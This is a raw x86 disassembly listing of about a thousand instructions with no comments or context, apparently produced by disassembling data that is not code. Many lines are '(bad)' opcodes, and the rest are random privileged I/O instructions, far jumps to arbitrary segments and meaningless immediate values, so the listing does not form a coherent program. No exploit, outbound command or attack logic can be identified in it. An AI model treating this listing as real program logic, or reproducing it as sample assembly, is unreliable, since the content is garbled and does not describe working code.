  429fdc:	icebp  
  429fdd:	(bad)  
  429fdf:	call   0xed4daaf0
  429fe4:	call   0xe8f185b1
  429fe9:	(bad)  
  429fea:	cmc    
  429feb:	out    0xb1,eax
  429fed:	in     al,0xf6
  429fef:	aad    0xba
  429ff1:	cli    
  429ff2:	int3   
  429ff3:	(bad)  
  429ff5:	loopne 0x429fc9
  429ff7:	sti    
  429ff8:	mov    esp,0xdfbfd9de
  429ffe:	iret   
  429fff:	cmc    
  42a000:	cld    
  42a001:	repz loopne 0x429fd1
  42a004:	jmp    0x429fcb
  42a006:	retf   0xf2e7
  42a009:	ret    
  42a00a:	in     al,dx
  42a00b:	mov    al,0xc6
  42a00d:	cmc    
  42a00e:	mov    ch,0xea
  42a010:	retf   
  42a011:	(bad)  
  42a013:	clc    
  42a014:	in     al,dx
  42a015:	(bad)  
  42a016:	aam    0xbf
  42a018:	in     al,0xd8
  42a01a:	sti    
  42a01b:	push   es
  42a01c:	out    0xc8,eax
  42a01e:	push   es
  42a01f:	std    
  42a020:	(bad)  
  42a021:	jmp    0xb3d3:0xd7c3f3ea
  42a028:	in     al,0xd0
  42a02a:	mov    al,0xeb
  42a02c:	mov    bl,0xf8
  42a02e:	mov    ebx,0x2d0fddf
  42a033:	cli    
  42a034:	(bad)  
  42a035:	aam    0xfe
  42a037:	push   es
  42a038:	repz loopne 0x42a017
  42a03b:	cmc    
  42a03c:	fxch   st(2)
  42a03e:	iret   
  42a03f:	fmul   st(2),st
  42a041:	les    eax,FWORD PTR [edx]
  42a043:	rep lods eax,DWORD PTR ds:[esi]
  42a045:	ret    
  42a046:	into   
  42a047:	lock shl ecx,cl
  42a04a:	int    0xc9
  42a04c:	mov    ebx,0xb3f4b4d7
  42a051:	cmc    
  42a052:	cmc    
  42a053:	hlt    
  42a054:	mov    esp,0xc1bdddfe
  42a059:	add    al,BYTE PTR ds:0xfcfff5d1
  42a05f:	push   cs
  42a060:	out    0xdf,eax
  42a062:	iret   
  42a063:	retf   0xe4bc
  42a066:	out    dx,al
  42a067:	div    ecx
  42a069:	scas   al,BYTE PTR es:[edi]
  42a06a:	sar    ecx,1
  42a06c:	shl    eax,cl
  42a06e:	sti    
  42a06f:	lods   al,BYTE PTR ds:[esi]
  42a070:	repz (bad) 
  42a073:	add    DWORD PTR [ebp-0xc114138],edi
  42a079:	lock rol BYTE PTR [esi],1
  42a07c:	push   es
  42a07d:	hlt    
  42a07e:	(bad)  
  42a080:	jmp    0x42a047
  42a082:	jecxz  0x42a070
  42a084:	fbld   TBYTE PTR [esi-0x29523c4d]
  42a08a:	(bad)  
  42a08b:	mov    dh,0xdb
  42a08d:	test   al,0xdd
  42a090:	mov    ch,0xc4
  42a092:	std    
  42a093:	jmp    eax
  42a095:	cmc    
  42a096:	fcmovnb st,st(7)
  42a098:	add    eax,0x6f705d6
  42a09d:	cld    
  42a09e:	fmul   DWORD PTR ds:0xe102fdc5
  42a0a4:	int3   
  42a0a5:	icebp  
  42a0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a0a7:	repz mov bh,0xd2
  42a0aa:	out    dx,al
  42a0ab:	rol    ebp,cl
  42a0ad:	(bad)  
  42a0ae:	out    0xbe,al
  42a0b0:	retf   
  42a0b1:	(bad)  
  42a0b2:	mov    ebp,0xfbc3da01
  42a0b7:	clc    
  42a0b8:	aam    0xbe
  42a0ba:	sar    al,1
  42a0bc:	add    BYTE PTR [esi],al
  42a0be:	(bad)  
  42a0bf:	in     eax,dx
  42a0c0:	push   cs
  42a0c1:	add    cl,dh
  42a0c3:	add    al,0xc0
  42a0c5:	iret   
  42a0c6:	leave  
  42a0c7:	(bad)  
  42a0c8:	aad    0xf7
  42a0ca:	int    0xe9
  42a0cc:	xlat   BYTE PTR ds:[ebx]
  42a0cd:	jmp    0x42a0b5
  42a0cf:	fstp   st(2)
  42a0d1:	cmc    
  42a0d2:	out    dx,eax
  42a0d3:	iret   
  42a0d4:	mov    ebx,0xfde1d807
  42a0d9:	faddp  st(4),st
  42a0db:	div    ah
  42a0dd:	in     eax,0xe0
  42a0df:	pop    es
  42a0e0:	(bad)  
  42a0e2:	add    ebp,esp
  42a0e4:	mov    bl,0xec
  42a0e6:	shl    esp,cl
  42a0e8:	mov    esp,0xf2f1d1ac
  42a0ed:	mov    ecx,0xd9dbc6f5
  42a0f2:	icebp  
  42a0f3:	icebp  
  42a0f4:	aad    0xe7
  42a0f6:	add    al,bh
  42a0f8:	lock add ebx,edx
  42a0fb:	fsub   st,st(5)
  42a0fd:	rol    al,1
  42a0ff:	pop    es
  42a100:	push   es
  42a101:	call   ebx
  42a103:	or     ebp,ebp
  42a105:	shl    edx,0xc9
  42a108:	shr    eax,1
  42a10a:	(bad)  
  42a10b:	bnd jmp 0x42a0fb
  42a10e:	stc    
  42a10f:	in     al,dx
  42a110:	stc    
  42a111:	shr    ecx,1
  42a113:	enter  0xfbf8,0xc3
  42a117:	repz cmc 
  42a119:	(bad)  
  42a11a:	fucomi st,st(2)
  42a11c:	ret    
  42a11d:	stc    
  42a11e:	retf   
  42a11f:	loopne 0x42a120
  42a121:	jecxz  0x42a121
  42a123:	loope  0x42a0e7
  42a125:	int3   
  42a126:	(bad)  
  42a127:	in     al,0xc0
  42a129:	rcl    ebp,cl
  42a12b:	loop   0x42a127
  42a12d:	out    0xfa,eax
  42a12f:	in     al,dx
  42a130:	jmp    0xdbfc710b
  42a135:	in     eax,dx
  42a136:	mov    esi,0xd6d8c7bc
  42a13b:	fninit 
  42a13d:	jmp    0xf509912d
  42a142:	(bad)  
  42a143:	in     al,dx
  42a144:	retf   
  42a145:	jmp    0xecb6:0xcad1eac9
  42a14c:	cmc    
  42a14d:	(bad)  
  42a14e:	in     eax,0xd5
  42a150:	fcom   st(5)
  42a152:	std    
  42a153:	add    edi,DWORD PTR [ebx-0x1c3c0128]
  42a159:	cmc    
  42a15a:	fdivrp st(4),st
  42a15c:	idiv   DWORD PTR [esi-0x391a3824]
  42a162:	jmp    0xe4e97f79
  42a167:	rol    ecx,1
  42a169:	lods   eax,DWORD PTR ds:[esi]
  42a16a:	enter  0xcfec,0xd6
  42a16e:	stc    
  42a16f:	in     al,dx
  42a170:	mov    ebp,0xd4babef2
  42a175:	fcom   st(0)
  42a177:	std    
  42a178:	fadd   DWORD PTR [eax]
  42a17a:	pop    es
  42a17b:	aam    0xb
  42a17d:	retf   
  42a17e:	xlat   BYTE PTR ds:[ebx]
  42a17f:	push   cs
  42a180:	(bad)  
  42a182:	retf   
  42a183:	push   es
  42a184:	icebp  
  42a185:	mov    edi,0xdbb0eec7
  42a18a:	shr    esi,1
  42a18c:	retf   0xcbd4
  42a18f:	int3   
  42a190:	out    dx,eax
  42a191:	mov    esp,0xf402f8e2
  42a196:	loope  0x42a155
  42a198:	mov    BYTE PTR [edi],0xbc
  42a19b:	fst    st(5)
  42a19d:	loopne 0x42a16a
  42a19f:	add    eax,0xdf80900
  42a1a4:	(bad)  
  42a1a5:	jecxz  0x42a185
  42a1a7:	shr    BYTE PTR [ebx-0x311d303c],0xb0
  42a1ae:	icebp  
  42a1af:	stc    
  42a1b0:	cld    
  42a1b1:	fnstsw WORD PTR [ebp-0x1018170b]
  42a1b7:	std    
  42a1b8:	(bad)  
  42a1b9:	mov    ebp,0xe4cb00d7
  42a1be:	cmc    
  42a1bf:	fprem  
  42a1c1:	or     eax,0xb3aee5e1
  42a1c6:	ror    esp,cl
  42a1c8:	enter  0xd0cf,0xce
  42a1cc:	retf   0xedb6
  42a1cf:	out    0xcd,al
  42a1d1:	iret   
  42a1d2:	add    ch,ah
  42a1d4:	hlt    
  42a1d5:	cli    
  42a1d6:	loopne 0x42a1b9
  42a1d8:	cld    
  42a1d9:	les    edi,FWORD PTR [ebp-0x261df900]
  42a1df:	leave  
  42a1e0:	retf   
  42a1e1:	or     dh,bl
  42a1e3:	stc    
  42a1e4:	stos   BYTE PTR es:[edi],al
  42a1e5:	fst    st(6)
  42a1e7:	cmc    
  42a1e8:	loopne 0x42a1ac
  42a1ea:	mov    bl,0xe0
  42a1ec:	repnz shr cl,0xf4
  42a1f0:	mov    bh,0xe8
  42a1f2:	(bad)  
  42a1f4:	mov    ebx,0x3c6fedf
  42a1f9:	mov    edx,0xde09d2fd
  42a1fe:	loop   0x42a1df
  42a200:	fdiv   st,st(4)
  42a202:	in     eax,dx
  42a203:	add    DWORD PTR [edx-0x302d294f],ebp
  42a209:	scas   al,BYTE PTR es:[edi]
  42a20a:	retf   0xf4d6
  42a20d:	(bad)  
  42a20e:	mov    edx,0xfaedd4d0
  42a213:	push   ebp
  42a215:	dec    esp
  42a217:	stc    
  42a218:	out    0xd1,al
  42a21a:	(bad)  
  42a21b:	icebp  
  42a21c:	jmp    0xe90a6623
  42a221:	out    dx,al
  42a222:	lds    ecx,FWORD PTR [edx+ebp*8]
  42a225:	jmp    0x42a1e7
  42a227:	out    dx,al
  42a228:	(bad)  
  42a229:	retf   0xbbee
  42a22c:	jmp    0xe2eb:0xecbeceb8
  42a233:	jecxz  0x42a225
  42a235:	add    bh,dh
  42a237:	in     eax,0xd5
  42a239:	std    
  42a23a:	push   es
  42a23b:	mov    esp,0xe1e9e1d6
  42a240:	aad    0x4
  42a242:	loope  0x42a208
  42a244:	loope  0x42a1ef
  42a246:	shr    eax,1
  42a248:	mov    esp,0xd3c2f2fb
  42a24d:	loopne 0x42a240
  42a24f:	in     eax,dx
  42a250:	aam    0xcd
  42a252:	into   
  42a253:	xlat   BYTE PTR ds:[ebx]
  42a254:	(bad)  
  42a256:	fadd   DWORD PTR [eax]
  42a258:	out    0xf3,al
  42a25a:	cld    
  42a25b:	add    al,BYTE PTR [eax]
  42a25d:	add    edi,esp
  42a25f:	imul   bl
  42a261:	fldl2e 
  42a263:	fmulp  st(4),st
  42a265:	jmp    0x42a236
  42a267:	lock jmp 0xbc138c59
  42a26d:	out    0xfa,al
  42a26f:	fst    st(2)
  42a271:	push   DWORD PTR [ebp+0x3d2f5d3]
  42a277:	repnz inc ch
  42a27a:	ret    
  42a27b:	jecxz  0x42a240
  42a27d:	in     al,0xc6
  42a27f:	(bad)  
  42a281:	clc    
  42a282:	retf   0xb10d
  42a285:	out    0xd3,al
  42a287:	iret   
  42a288:	xlat   BYTE PTR ds:[ebx]
  42a289:	loope  0x42a265
  42a28b:	loope  0x42a241
  42a28d:	cli    
  42a28e:	retf   0xceeb
  42a291:	(bad)  
  42a293:	push   ecx
  42a295:	repnz mov ecx,0xc6ebdaf9
  42a29b:	fiadd  WORD PTR [ecx]
  42a29d:	fcom   st(6)
  42a29f:	out    0xfb,eax
  42a2a1:	enter  0xda0c,0xe7
  42a2a5:	loope  0x42a267
  42a2a7:	out    0xec,al
  42a2a9:	(bad)  
  42a2aa:	in     eax,0xa8
  42a2ac:	shr    DWORD PTR [esi-0x49164413],1
  42a2b2:	shr    ch,1
  42a2b4:	fidivr DWORD PTR [edx+esi*8-0x18fd27fb]
  42a2bb:	add    cl,cl
  42a2bd:	fcmovne st,st(1)
  42a2bf:	pminsw mm5,mm1
  42a2c2:	in     eax,0xe2
  42a2c4:	shl    DWORD PTR [edx-0x531b3242],cl
  42a2ca:	mov    dh,0xd2
  42a2cc:	shl    BYTE PTR [eax-0xa452f48],cl
  42a2d2:	clc    
  42a2d3:	loope  0x42a2a4
  42a2d5:	add    edi,ebp
  42a2d7:	div    dh
  42a2d9:	add    dl,ch
  42a2db:	add    al,dl
  42a2dd:	(bad)  
  42a2de:	aam    0xdf
  42a2e0:	or     dh,bl
  42a2e2:	fsubrp st(5),st
  42a2e4:	in     al,0xb0
  42a2e6:	test   bl,0xe3
  42a2e9:	(bad)
  42a2ec:	fxch   st(5)
  42a2ee:	lods   eax,DWORD PTR ds:[esi]
  42a2ef:	mov    esi,0xf4fdbdf4
  42a2f4:	aam    0xb6
  42a2f6:	loop   0x42a2c9
  42a2f8:	shl    esp,1
  42a2fa:	sti    
  42a2fb:	fchs   
  42a2fd:	in     al,0xc5
  42a2ff:	fisttp QWORD PTR [eax]
  42a301:	into   
  42a302:	iret   
  42a303:	add    bh,BYTE PTR [edi-0x93c0e2f]
  42a309:	mov    dl,0xc2
  42a30b:	(bad)  
  42a30c:	xlat   BYTE PTR ds:[ebx]
  42a30d:	(bad)  
  42a30e:	retf   0xfcf1
  42a311:	rcl    bl,1
  42a313:	(bad)  
  42a314:	into   
  42a315:	add    BYTE PTR [edx],al
  42a317:	into   
  42a318:	shl    cl,cl
  42a31a:	ror    BYTE PTR [edx],0xdb
  42a31d:	cli    
  42a31e:	add    bh,al
  42a320:	fdivp  st(6),st
  42a322:	clc    
  42a323:	jmp    0xe5c7:0xc2cfdec5
  42a32a:	not    ebx
  42a32c:	hlt    
  42a32d:	loopne 0x42a2f8
  42a32f:	jmp    0x42a2e5
  42a331:	std    
  42a332:	fcomip st,st(1)
  42a334:	call   0x11c9df1
  42a339:	in     al,dx
  42a33a:	fnclex 
  42a33c:	sar    edi,0xf4
  42a33f:	add    ecx,ecx
  42a341:	pop    es
  42a342:	dec    esp
  42a344:	fadd   st,st(7)
  42a346:	jmp    0xcbf2:0xa9ecb0a4
  42a34d:	scas   al,BYTE PTR es:[edi]
  42a34e:	hlt    
  42a34f:	std    
  42a350:	bnd call 0xe81b5f33
  42a356:	out    0xf0,al
  42a358:	fsub   st(3),st
  42a35a:	icebp  
  42a35b:	(bad)  
  42a35d:	loop   0x42a35e
  42a35f:	jecxz  0x42a328
  42a361:	stc    
  42a362:	or     ch,cl
  42a364:	lock out dx,al
  42a366:	in     eax,dx
  42a367:	mov    al,0xf7
  42a369:	mov    ch,0xf5
  42a36b:	mov    bh,0xd4
  42a36d:	jmp    0xd341994b
  42a372:	aad    0xb4
  42a374:	clc    
  42a375:	lock (bad) 
  42a378:	rcr    bh,cl
  42a37a:	rcr    al,1
  42a37c:	push   es
  42a37d:	jmp    0x42a33f
  42a37f:	lds    ecx,FWORD PTR [eax]
  42a381:	or     al,0xf2
  42a383:	jmp    0xb222864a
  42a388:	(bad)  
  42a389:	jecxz  0x42a35c
  42a38b:	(bad)  
  42a38c:	retf   
  42a38d:	imul   esi
  42a38f:	(bad)  
  42a391:	in     al,0xee
  42a393:	add    edi,ebp
  42a395:	sar    BYTE PTR [esi-0x19251c25],0xfa
  42a39c:	(bad)  
  42a39d:	fadd   st,st(5)
  42a39f:	pop    es
  42a3a0:	retf   
  42a3a1:	adc    edi,esi
  42a3a3:	fucomp st(7)
  42a3a5:	fucomip st,st(6)
  42a3a7:	out    dx,al
  42a3a8:	int    0xb0
  42a3aa:	loop   0x42a362
  42a3ac:	cli    
  42a3ad:	retf   
  42a3ae:	(bad)  
  42a3af:	cmc    
  42a3b0:	iret   
  42a3b1:	mov    ebx,0xece2d5f3
  42a3b6:	in     al,dx
  42a3b7:	(bad)  
  42a3b8:	mov    ebx,0xc9fbdcf9
  42a3bd:	fdivrp st(4),st
  42a3bf:	in     eax,0xe4
  42a3c1:	call   0xf1159d8f
  42a3c6:	into   
  42a3c7:	fst    st(6)
  42a3c9:	scas   al,BYTE PTR es:[edi]
  42a3ca:	repz fcmovne st,st(1)
  42a3cd:	iret   
  42a3ce:	(bad)  
  42a3cf:	mov    edx,0xcfb5cceb
  42a3d4:	fsubp  st(0),st
  42a3d6:	mov    ch,0xf7
  42a3d8:	loop   0x42a3dd
  42a3da:	fcmovbe st,st(5)
  42a3dc:	retf   0xc9c4
  42a3df:	add    ebp,edx
  42a3e1:	call   0xcc30b7cf
  42a3e6:	ret    0xd1e9
  42a3e9:	mov    ah,0xcc
  42a3eb:	mov    bh,0xea
  42a3ed:	fcom   st(7)
  42a3ef:	(bad)  
  42a3f0:	(bad)  
  42a3f1:	sar    edx,1
  42a3f3:	mov    ecx,0x6cfcfbe
  42a3f8:	mov    esi,0xf4c400db
  42a3fd:	std    
  42a3fe:	stc    
  42a3ff:	in     al,0xec
  42a401:	les    eax,FWORD PTR [esi]
  42a403:	fisubr WORD PTR [eax-0x4950353f]
  42a409:	icebp  
  42a40a:	shl    cl,1
  42a40c:	fxch   st(1)
  42a40e:	jmp    0xca158004
  42a413:	int3   
  42a414:	(bad)  
  42a415:	loop   0x42a409
  42a417:	mul    eax
  42a419:	sti    
  42a41a:	mul    ecx
  42a41c:	or     ebx,ebx
  42a41e:	in     eax,0xfd
  42a420:	lds    eax,FWORD PTR [edi]
  42a422:	adc    bl,ah
  42a424:	scas   al,BYTE PTR es:[edi]
  42a425:	shr    esp,0xc9
  42a428:	int    0xb7
  42a42a:	mov    ch,0xd2
  42a42c:	clc    
  42a42d:	jmp    0x42a405
  42a42f:	aam    0xca
  42a431:	(bad)  
  42a432:	fcomp  st(2)
  42a434:	repz out 0xfc,eax
  42a437:	mov    BYTE PTR [ecx],0xbc
  42a43a:	jmp    ebx
  42a43c:	retf   
  42a43d:	fnstsw WORD PTR [ebp-0x1b373c19]
  42a443:	jecxz  0x42a436
  42a445:	rcl    eax,1
  42a447:	jecxz  0x42a433
  42a449:	icebp  
  42a44a:	lock stc 
  42a44c:	stc    
  42a44d:	aad    0xda
  42a44f:	sti    
  42a450:	in     eax,dx
  42a451:	in     eax,dx
  42a452:	into   
  42a453:	aam    0xdc
  42a455:	mov    edx,0xe2d9eddf
  42a45a:	in     al,0xd0
  42a45c:	rcl    ah,0xdb
  42a45f:	add    ebx,eax
  42a461:	add    DWORD PTR [edx],eax
  42a463:	bnd call 0xb7298c15
  42a469:	mov    edi,0xebb8cbeb
  42a46f:	sti    
  42a470:	mov    edi,0xeec9d7ee
  42a475:	repnz fstp st(6)
  42a478:	repz repz rol BYTE PTR [eax],1
  42a47c:	not    eax
  42a47e:	enter  0xfeff,0xd4
  42a482:	in     eax,0xfc
  42a484:	(bad)  
  42a485:	out    dx,al
  42a486:	fmulp  st(6),st
  42a488:	rcr    esp,0xe4
  42a48b:	mov    cl,0xf5
  42a48d:	mov    ah,0xeb
  42a48f:	int    0xce
  42a491:	retf   0xedbe
  42a494:	cld    
  42a495:	loope  0x42a48a
  42a497:	cmc    
  42a498:	out    0xdd,al
  42a49a:	out    0xeb,al
  42a49c:	retf   
  42a49d:	retf   
  42a49e:	loopne 0x42a476
  42a4a0:	aad    0xdb
  42a4a2:	(bad)  
  42a4a3:	clc    
  42a4a4:	call   0xde2f987b
  42a4a9:	shl    ecx,1
  42a4ab:	lock not esp
  42a4ae:	mov    dh,0xd3
  42a4b0:	rol    BYTE PTR [ebx],1
  42a4b2:	iret   
  42a4b3:	fmul   st,st(5)
  42a4b5:	rcr    eax,1
  42a4b7:	int    0xf6
  42a4b9:	loope  0x42a482
  42a4bb:	add    ch,ah
  42a4bd:	loop   0x42a4bd
  42a4bf:	add    ecx,DWORD PTR [ecx]
  42a4c1:	(bad)  
  42a4c3:	jmp    0xc90d6f98
  42a4c8:	into   
  42a4c9:	xlat   BYTE PTR ds:[ebx]
  42a4ca:	retf   
  42a4cb:	in     eax,0xec
  42a4cd:	mov    dh,0xd3
  42a4cf:	jmp    0xc1b9:0xb9bdecff
  42a4d6:	repz shl cl,1
  42a4d9:	repnz fstp st(2)
  42a4dc:	ret    0xdce3
  42a4df:	or     eax,0xc8fecae9
  42a4e4:	shr    BYTE PTR [eax-0x4501617],1
  42a4ea:	in     eax,0xac
  42a4ec:	into   
  42a4ed:	xlat   BYTE PTR ds:[ebx]
  42a4ee:	retf   0xf5ec
  42a4f1:	repz repz aad 0xf2
  42a4f5:	fistp  QWORD PTR [ecx-0x72a332a]
  42a4fb:	f2xm1  
  42a4fd:	add    eax,0xd4dce2ca
  42a502:	in     al,0xd9
  42a504:	(bad)  
  42a505:	test   eax,0xeed1dea8
  42a50a:	ret    0xcfe2
  42a50d:	mov    ch,0xef
  42a50f:	(bad)  
  42a510:	call   0xbffb72e6
  42a515:	(bad)  
  42a517:	test   dl,0xf8
  42a51a:	in     eax,0xea
  42a51c:	add    al,0xd6
  42a51e:	retf   
  42a51f:	loope  0x42a4fd
  42a521:	add    al,BYTE PTR [edx]
  42a523:	shr    BYTE PTR [edi-0x2b293551],cl
  42a529:	fcmovnbe st,st(6)
  42a52b:	loope  0x42a511
  42a52d:	into   
  42a52e:	mov    bh,0xeb
  42a530:	fucom  st(4)
  42a532:	in     eax,dx
  42a533:	lock (bad) 
  42a535:	ror    ch,1
  42a537:	add    dh,bh
  42a539:	ret    
  42a53a:	shl    esp,1
  42a53c:	shl    dh,1
  42a53e:	ftst   
  42a540:	add    ecx,DWORD PTR [ecx]
  42a542:	or     al,ch
  42a544:	icebp  
  42a545:	mov    al,0xef
  42a547:	scas   eax,DWORD PTR es:[edi]
  42a548:	mov    dh,0xf2
  42a54a:	in     al,0xe8
  42a54c:	mov    ebx,0xbbd4c4d6
  42a551:	mov    ebx,0xb8cdf2f0
  42a556:	int3   
  42a557:	fiadd  DWORD PTR [ecx]
  42a559:	(bad)  
  42a55c:	add    edx,esi
  42a55e:	push   cs
  42a55f:	inc    bh
  42a561:	in     eax,dx
  42a562:	sti    
  42a563:	retf   0xade2
  42a566:	retf   0xebd0
  42a569:	out    0xd7,eax
  42a56b:	out    0xed,eax
  42a56d:	clc    
  42a56e:	iret   
  42a56f:	mov    ebx,0xf5d1f7bb
  42a574:	int3   
  42a575:	mov    edi,0x6c6fbf3
  42a57a:	or     ah,cl
  42a57c:	test   DWORD PTR [edx],0xc9ca06ef
  42a582:	add    bl,ah
  42a584:	mov    edi,0xcbb0ecf1
  42a589:	int3   
  42a58a:	cli    
  42a58b:	jmp    0x42a55c
  42a58d:	lock bnd call 0xf82b935c
  42a594:	int3   
  42a595:	xlat   BYTE PTR ds:[ebx]
  42a596:	pop    es
  42a597:	hlt    
  42a598:	int3   
  42a599:	(bad)  
  42a59b:	(bad)
  42a59e:	or     ch,dl
  42a5a0:	cli    
  42a5a1:	in     eax,dx
  42a5a2:	or     eax,0xdef7c400
  42a5a7:	jmp    0xf3325c78
  42a5ac:	shr    ah,0xd3
  42a5af:	clc    
  42a5b0:	(bad)  
  42a5b1:	in     al,0xd3
  42a5b3:	cld    
  42a5b4:	fidiv  WORD PTR [esi-0x2838fe0b]
  42a5ba:	or     al,dh
  42a5bc:	add    al,0xfd
  42a5be:	fcmove st,st(3)
  42a5c0:	cli    
  42a5c1:	call   0xcb28909e
  42a5c6:	loope  0x42a5ad
  42a5c8:	loopne 0x42a5c0
  42a5ca:	mov    bl,0xd4
  42a5cc:	mov    ch,0xc0
  42a5ce:	leave  
  42a5cf:	ror    ebp,1
  42a5d1:	mov    esi,0xd8f3dcee
  42a5d6:	fneni(8087 only) 
  42a5d8:	rol    eax,1
  42a5da:	in     eax,0xe3
  42a5dc:	(bad)  
  42a5dd:	retf   0xaef
  42a5e0:	or     BYTE PTR [ebx],cl
  42a5e2:	sti    
  42a5e3:	in     al,dx
  42a5e4:	out    dx,eax
  42a5e5:	shr    esi,1
  42a5e7:	repnz xlat BYTE PTR ds:[ebx]
  42a5e9:	scas   al,BYTE PTR es:[edi]
  42a5ea:	aam    0xeb
  42a5ec:	cmc    
  42a5ed:	(bad)  
  42a5ef:	(bad)  
  42a5f0:	xlat   BYTE PTR ds:[ebx]
  42a5f1:	fistp  QWORD PTR [esi-0x383f2b32]
  42a5f7:	loopne 0x42a5de
  42a5f9:	mov    esi,0xcadfd1f5
  42a5fe:	in     eax,0xe2
  42a600:	hlt    
  42a601:	fisttp DWORD PTR [edi]
  42a603:	or     ah,ch
  42a605:	jmp    0xe5e2:0xcde0e0bd
  42a60c:	repnz mov bh,0xc6
  42a60f:	vpavgw ymm7,ymm2,ymm2
  42a613:	aam    0x0
  42a615:	std    
  42a616:	aad    0xff
  42a618:	loop   0x42a5d8
  42a61a:	inc    BYTE PTR [eax]
  42a61c:	shl    eax,0xf5
  42a61f:	ror    bl,0xd
  42a622:	add    ecx,esi
  42a624:	test   eax,0xf0cfc2d2
  42a629:	in     al,0xe2
  42a62b:	(bad)  
  42a62c:	ror    ah,1
  42a62e:	repnz mov esi,0xbed9d5d9
  42a634:	mov    edx,0xcddad9fd
  42a639:	(bad)  
  42a63a:	(bad)  
  42a63b:	(bad)  
  42a63c:	jmp    esi
  42a63e:	(bad)  
  42a63f:	fchs   
  42a641:	aam    0xf9
  42a643:	retf   0xb2e1
  42a646:	repz shl DWORD PTR [ecx-0x281f310b],1
  42a64d:	jmp    0x42a615
  42a64f:	(bad)  
  42a650:	repz xlat BYTE PTR ds:[ebx]
  42a652:	mov    ebp,0xd4d2ecd6
  42a657:	jecxz  0x42a618
  42a659:	in     al,dx
  42a65a:	out    0x6,al
  42a65c:	loopne 0x42a661
  42a65e:	jecxz  0x42a663
  42a660:	out    dx,eax
  42a661:	ret    0xe8d3
  42a664:	int    0xc2
  42a666:	loop   0x42a658
  42a668:	lods   eax,DWORD PTR ds:[esi]
  42a669:	lods   al,BYTE PTR ds:[esi]
  42a66a:	mov    dh,0xba
  42a66c:	mov    cl,0xf1
  42a66e:	int    0xed
  42a670:	rcl    ah,1
  42a672:	hlt    
  42a673:	div    ebx
  42a675:	jmp    edx
  42a677:	mov    esp,0xddd9de07
  42a67c:	shl    ecx,1
  42a67e:	push   es
  42a67f:	loope  0x42a681
  42a681:	or     al,0xfe
  42a683:	adc    edx,esi
  42a685:	jmp    0x42a65e
  42a687:	repnz fsubr st(1),st
  42a68a:	call   0xb7368e5e
  42a68f:	aam    0xf8
  42a691:	out    dx,al
  42a692:	repnz rcl dl,1
  42a695:	(bad)  
  42a697:	ffreep st(7)
  42a699:	repnz (bad) 
  42a69c:	out    0xde,al
  42a69e:	add    DWORD PTR [edi],ecx
  42a6a0:	lds    eax,FWORD PTR [ecx+ebx*8]
  42a6a3:	repz (bad) 
  42a6a5:	into   
  42a6a6:	repnz out dx,al
  42a6a8:	repz loop 0x42a682
  42a6ab:	iret   
  42a6ac:	into   
  42a6ad:	repnz retf 0xe5df
  42a6b1:	mov    ah,0xec
  42a6b3:	mov    edi,0xf0c0faff
  42a6b8:	hlt    
  42a6b9:	test   BYTE PTR [edi],0xc0
  42a6bc:	jmp    0xca518bc6
  42a6c1:	inc    ah
  42a6c3:	ror    al,cl
  42a6c5:	int    0xec
  42a6c7:	enter  0xe9ac,0xd1
  42a6cb:	into   
  42a6cc:	mov    ebx,0xfbe5b8f2
  42a6d1:	mov    ebp,0xcdd302fe
  42a6d6:	fidiv  WORD PTR [esp+ebx*8+0x6c0e2f6]
  42a6dd:	stc    
  42a6de:	add    dh,dl
  42a6e0:	loope  0x42a6c3
  42a6e2:	add    ah,dl
  42a6e4:	in     eax,dx
  42a6e5:	(bad)  
  42a6e6:	repz mov dl,0xf3
  42a6e9:	lods   al,BYTE PTR ds:[esi]
  42a6ea:	(bad)  
  42a6eb:	repz (bad) 
  42a6ed:	(bad)  
  42a6ee:	clc    
  42a6ef:	mov    dh,0xcc
  42a6f1:	mov    esi,0xd0d4dfea
  42a6f6:	(bad)  
  42a6f8:	hlt    
  42a6f9:	int3   
  42a6fa:	in     al,0xd8
  42a6fc:	fild   DWORD PTR [edx]
  42a6fe:	aad    0xeb
  42a700:	out    dx,al
  42a701:	add    eax,DWORD PTR [ebx]
  42a703:	ffreep st(2)
  42a705:	(bad)  
  42a706:	int    0xac
  42a708:	jmp    0xd10d6ec3
  42a70d:	scas   al,BYTE PTR es:[edi]
  42a70e:	fdivr  DWORD PTR [eax-0x8210f10]
  42a714:	cld    
  42a715:	push   ebx
  42a717:	sti    
  42a718:	ret    
  42a719:	loop   0x42a71c
  42a71b:	(bad)  
  42a71c:	sti    
  42a71d:	xlat   BYTE PTR ds:[ebx]
  42a71e:	out    dx,eax
  42a71f:	add    DWORD PTR [esi],eax
  42a721:	add    esi,edi
  42a723:	fmul   st(4),st
  42a725:	(bad)  
  42a726:	int3   
  42a727:	shl    esi,1
  42a729:	icebp  
  42a72a:	retf   0xe1e6
  42a72d:	mov    ch,0xbb
  42a72f:	(bad)  
  42a730:	std    
  42a731:	fst    st(0)
  42a733:	cld    
  42a734:	hlt    
  42a735:	mov    eax,0xd1fdf6c3
  42a73a:	mov    esp,0xcfe9f0ea
  42a73f:	(bad)  
  42a741:	std    
  42a742:	add    ecx,esp
  42a744:	mov    bl,0xae
  42a746:	test   eax,0xd1e5abae
  42a74b:	retf   
  42a74c:	mov    bh,0xee
  42a74e:	mov    bh,0xe6
  42a750:	sar    DWORD PTR [ebp+edi*8-0x804401d],1
  42a757:	shl    ebx,cl
  42a759:	(bad)  
  42a75a:	stc    
  42a75b:	sti    
  42a75c:	inc    cl
  42a75e:	(bad)  
  42a75f:	cld    
  42a760:	out    dx,eax
  42a761:	into   
  42a762:	repz in al,0xae
  42a765:	repz in eax,dx
  42a767:	mov    bh,0xed
  42a769:	cmc    
  42a76a:	loope  0x42a720
  42a76c:	in     al,dx
  42a76d:	mov    cl,0xe4
  42a76f:	enter  0xd2f6,0xd3
  42a773:	aad    0xdc
  42a775:	aam    0x6
  42a777:	into   
  42a778:	fstp   st(2)
  42a77a:	pop    es
  42a77b:	ret    
  42a77c:	(bad)  
  42a77e:	fadd   st(0),st
  42a780:	pop    es
  42a781:	add    ch,ch
  42a783:	add    eax,0xf6bdc2de
  42a788:	out    dx,al
  42a789:	lock retf 
  42a78b:	test   al,0xb0
  42a78d:	(bad)  
  42a78e:	out    0xfd,eax
  42a790:	mov    edi,0xbff8d2d3
  42a795:	div    BYTE PTR [ebp-0xe002e21]
  42a79b:	shl    ecx,0xff
  42a79e:	cld    
  42a79f:	clc    
  42a7a0:	out    0x0,eax
  42a7a2:	repz retf 
  42a7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7a5:	shl    BYTE PTR [eax-0x4c391136],0xe0
  42a7ac:	loopne 0x42a768
